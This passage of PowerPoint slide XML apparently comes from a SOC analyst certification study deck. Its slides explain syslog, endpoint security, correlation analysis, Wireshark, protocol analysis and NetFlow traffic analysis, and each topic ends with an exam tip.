              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Authentication logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Event logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Syslogs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66</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DATA ANALYTICS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Syslog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Syslog is a standardized protocol and message format for generating, transporting, and storing event log messages, originally common on Unix and Linux systems and now used broadly across network and security devices.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Each message carries a facility code indicating the subsystem that produced it and a severity level from 0 (emergency) to 7 (debug), and messages are commonly forwarded over UDP or TCP port 514 to a central collector.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC, syslog is the lingua franca of log forwarding, letting heterogeneous devices ship their events to a single syslog server or SIEM for aggregation, correlation, and retention.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect the exam to test the syslog severity scale, the default port 514, and syslog's role as a common protocol for centralizing device and host logs into a SIEM.</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67</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DATA ANALYTICS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Syslog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g_48ab3be242.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="874658" y="1783080"/>
            <a:ext cx="10439636" cy="4434840"/>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68</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DATA ANALYTICS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Syslogd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Syslogd is the daemon, or background service, on Linux and Unix systems that implements syslog by collecting and recording log messages generated by the kernel, services, and applications on the machine.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The same syslog capability is embedded in network and security appliances such as routers, switches, wireless access points, and firewalls, while Windows uses its own Event Log service and typically needs an agent or forwarder to emit syslog.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Beyond writing logs locally, syslogd can be configured to point at a central syslog server, which is what enables organization-wide aggregation and centralized analysis rather than leaving evidence scattered on each device.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam expects you to identify syslogd as the Linux logging daemon and to know that devices can forward their syslog output to a central server, whereas Windows relies on different native logging.</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69</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DATA ANALYTICS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Syslogd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Daemon (service) in Linux</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Collects &amp; records messages from the machine</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Also found in embedded systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Routers, switches, access points, firewalls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Windows has other options</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Collect logs in one place, can also point to central server for aggregation &amp; analysis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70</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DATA ANALYTICS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Syslog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g_d519a95f11.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2440258" y="1783080"/>
            <a:ext cx="7308435" cy="4434840"/>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71</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ENDPOINT SECURITY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Endpoint Security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Endpoint security protects workstations, servers, and other end-user devices by detecting and blocking malicious code, using techniques such as fingerprinting or hashing to match files against known-bad indicators and reverse engineering (decomposition) to understand how a sample behaves.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A key modern challenge is fileless or in-memory malware, which loads and executes in RAM without being written to the file system so it evades traditional file-scanning antivirus; rootkits partly use this technique to hide from detection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts test suspicious samples by detonating them in a sandbox, an isolated environment that reveals behavior without risking production systems, and use User and Entity Behavior Analytics (UEBA) to build a baseline of normal user and device activity and flag deviations that signal compromise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This matters to a SOC because endpoints are the most common initial foothold, and combining signature detection, sandboxing, and behavioral analytics catches both known and novel threats.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam pairs endpoint security with fileless/in-memory malware, sandbox detonation for behavioral analysis, and UEBA baselining to detect anomalous user and entity behavior.</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72</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ENDPOINT SECURITY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Endpoint Security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Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Fingerprinting/hashing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Decompose (reverse engineering)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Protect against it by detecting and blocking</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Fileless (in-memory) malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Loads into memory but not stored in the file system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Example: rootkits (in part)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Test via sandbox</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73</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ENDPOINT SECURITY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Endpoint Security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User and entity behavior analytics (UEBA)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Create baseline of normal behavior</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Known-good behavior</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Makes anomalous/ abnormal behavior easier to detect</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74</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RECON RESULTS: PART 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Sources of Data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Security monitoring draws on an abundance of data sources, including IDS and IPS logs, router and switch logs, firewall logs, endpoint logs, and full packet captures, each offering a different vantage point on activity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Some sources are best for reconstructing a single event in detail, most notably packet captures produced by tools such as tcpdump or Wireshark, which preserve the full content of network traffic for point-in-time analysis.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst chooses the source that fits the question at hand, using firewall and flow data to see connection patterns broadly and packet captures to drill into exactly what happened during one suspicious session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenario questions that ask which data source best answers a given investigative need, contrasting broad log sources with packet captures that are best for detailed single-event analysis.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75</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RECON RESULTS: PART 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Sources of Data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No shortage of sources</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  IDS (Intrusion detection system) logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  IPS (Intrusion prevention system) logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Router &amp; switch logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Firewall logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Packet captures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Endpoint logs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76</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RECON RESULTS: PART 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Sources of Data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Best for single events</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Tools</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Packet capture</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Protocol analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Network analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Wireless analysis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77</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RECON RESULTS: PART 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Correlation Analysis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Correlation analysis examines large volumes of data from many sources together to identify relationships between events that would appear unrelated when viewed in isolation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It looks for trends and linked activity across the network, connecting, for example, a firewall denial, a failed authentication, and an IDS alert into a single storyline that points to a coordinated attack.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This is a core SIEM function and matters to a SOC because sophisticated intrusions unfold across multiple systems, and only by correlating events can an analyst reconstruct the full attack chain and reduce false positives.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam contrasts correlation analysis, which links events across many sources at scale, with single-event techniques like packet capture, and ties it to SIEM rule logic.</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78</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RECON RESULTS: PART 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Correlation Analysis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Larger volumes of data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Looks at trends across a network</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79</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RECON RESULTS: PART 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Wireshark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Wireshark is a free, cross-platform, TCP/IP packet sniffer and protocol analyzer that captures network traffic and lets an analyst inspect it packet by packet for point-in-time analysis.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It decodes hundreds of protocols, can follow and reconstruct connection-oriented streams such as a TCP session, and reports statistics about conversations, endpoints, and protocol distribution.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC analyst, Wireshark is the tool of choice for deep dives into a specific captured event, revealing exactly what data crossed the wire, exposing cleartext credentials or malware payloads, and confirming whether traffic matches or violates expected protocol behavior.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect Wireshark to appear as the packet and protocol analysis tool for detailed point-in-time inspection and stream reconstruction, distinct from flow tools that summarize traffic.</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80</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RECON RESULTS: PART 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Wireshark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Point-in-time analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Packet &amp; protocol analysis tool</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Connection-oriented</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Cross-platform</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  TCP/IP packet sniffer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Captures &amp; analyzes packets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Reconstructs network traffic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Reports statistics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81</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RECON RESULTS: PART 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Protocol Analysis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Protocol analysis is the examination of network traffic against the rules and expected behavior of the protocols in use, checking whether the sequence, flags, fields, and content of communication conform to the standard.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It requires the analyst to know what normal protocol exchanges should look like so they can recognize what looks off, such as malformed packets, unexpected ports, protocol tunneling, or handshakes that never complete.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This skill helps a SOC detect attacks that abuse or masquerade within legitimate protocols, since deviations from documented protocol behavior frequently indicate scanning, evasion, exfiltration, or exploitation attempts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests that recognizing anomalous protocol behavior depends on knowing the protocol's expected baseline, and that deviations from it are indicators of malicious activity.</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82</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RECON RESULTS: PART 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Protocol Analysis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Know what to expect</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Know what looks ‘off’</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83</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RECON RESULTS: PART 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Traffic Analysis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Traffic analysis studies the flow of communications across a network rather than the full content of each packet, and NetFlow, a system developed by Cisco, is the standard mechanism, recording source and destination events and grouping packets that share attributes into flows.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Each flow record is metadata, capturing details such as source and destination IP, ports, protocol, and byte and packet counts, and utilities like ntop let an analyst visualize and explore these flows.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The challenge with performing this in real time comes from the demands of sensing the traffic, computing the flow records, and storing the resulting metadata at scale, which is why flow data is often sampled or analyzed slightly after the fact.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Traffic analysis matters to a SOC because flow metadata is compact enough to retain for long periods and reveals large-scale patterns like beaconing, data exfiltration, and lateral movement that per-packet capture is too voluminous to show.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
